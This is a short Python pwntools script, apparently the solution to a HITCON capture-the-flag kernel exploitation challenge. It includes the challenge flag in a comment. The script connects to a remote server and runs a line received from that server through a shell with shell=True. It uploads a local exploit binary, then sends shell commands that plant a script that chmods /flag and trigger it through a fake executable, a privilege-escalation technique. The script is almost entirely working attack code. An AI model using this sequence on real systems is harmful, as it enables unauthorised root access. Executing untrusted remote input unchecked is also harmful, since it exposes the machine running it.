#!/usr/bin/env python
from pwn import *
import os, subprocess

# hitcon{easy_graph_theory_easy_kernel_exploitation}

y = remote( '3.113.76.29' , 9427 )

y.recvline()
y.send( subprocess.check_output( y.recvline() , shell=True ) )

exp = open( './exp' ).read()

y.sendlineafter( '2M)' , str(len(exp)) )
y.send(exp)

#y.sendlineafter( '$ ' , "echo -ne '\\xff\\xff\\xff\\xff' > fake" )
y.sendlineafter( '$ ' , "echo -ne '\\xffyyy' > fake" )
y.sendlineafter( '$ ' , "chmod +x fake" )
y.sendlineafter( '$ ' , "echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' > /tmp/y" )
y.sendlineafter( '$ ' , "chmod +x /tmp/y" )

y.sendlineafter( '$ ' , './exp' )
y.sendlineafter( '$ ' , './exp' )
y.sendlineafter( '$ ' , './fake' )
y.sendlineafter( '$ ' , 'cat /flag' )

y.interactive()